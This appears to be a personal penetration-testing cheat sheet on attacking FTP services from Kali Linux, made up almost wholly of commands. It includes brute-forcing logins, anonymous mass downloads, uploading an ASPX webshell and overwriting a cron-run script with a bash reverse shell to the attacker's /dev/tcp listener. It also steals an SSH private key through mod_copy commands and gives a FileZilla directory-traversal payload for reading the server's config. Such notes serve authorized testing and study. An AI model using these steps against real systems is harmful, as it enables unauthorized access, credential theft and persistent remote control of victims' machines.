#### FTP Enumeration
==CHECK TO SEE IF YOU CAN UPLOAD FILES!==

```bash - kali
ftp $TARGET 21
```

Admin login
```bash - kali
admin
```

Anonymous login
```bash - kali
anonymous
```

```bash - kali
nmap --script ftp-brute -p 21 $TARGET
```

Check for directory traversal:
```bash - kali
ls ../
```

#### Exit Extended Passive Mode
![[Pasted image 20220401094126.png]]

```bash - kali
pass
```

```bash - kali
ls
```

Then switch to binary mode to upload files:
```bash - kali
bin
```

#### Downloading recursively 
```bash - kali
wget --mirror 'ftp://anonymous:anonymous@$TARGET'
```

```bash - kali
wget -r ftp://anonymous@$TARGET:21
```

```bash - kali
wget -m ftp://anonymous:anonymous@$TARGET
```

```bash - kali
wget -m --no-passive ftp://anonymous:anonymous@$TARGET
```

#### Upload reverse shell
```bash - kali
binary
```

```bash - kali
put cmdasp.aspx
```

Then visit webshell in web browser:
```bash - kali
firefox http://$TARGET/cmdasp.aspx
```

#### Display file without downloading
```bash - kali
get <FILENAME> -
```

#### Existing scripts
`scripts` folder found on FTP, file called `clean.sh` that is part of cron job.  Made a reverse shell with same name, uploaded and overwrote.

clean.sh
```bash - kali
echo '#!/bin/bash \nbash -i >& /dev/tcp/$KALI/443 0>&1' > clean.sh
```

```bash - kali
ftp $TARGET
```

```bash - kali
cd scripts
```

```bash - kali
put clean.sh
```

Set up listener and wait.

[[rlwrap]]

#### Nmap vsftpd script

```bash - kali
nmap --script ftp-vsftpd-backdoor -p 21 $TARGET
```

#### copy id_rsa

```bash - kali
nc $TARGET 21
```

```bash - kali
cpfr /home/user/.ssh/id_rsa
```

```bash - kali
cpto /home/kali/id_rsa
```

[[Port 22 - SSH  ~#id_rsa]]

#### Home FTP Server
https://www.exploit-db.com/exploits/34050

#### FileZilla Directory Transversal
```
.....=C:/Program+Files/FileZilla+Server/FileZilla+Server.xml
```

To crack passwords, try:
[[Hashcat#FileZilla 0 9 55]]

#### vsftpd
Config file is most likely located at `/etc/vsftpd.conf`. If you can read this file, look for `anon_root=/srv` entry to find root directory of FTP.  `/srv` in this example.
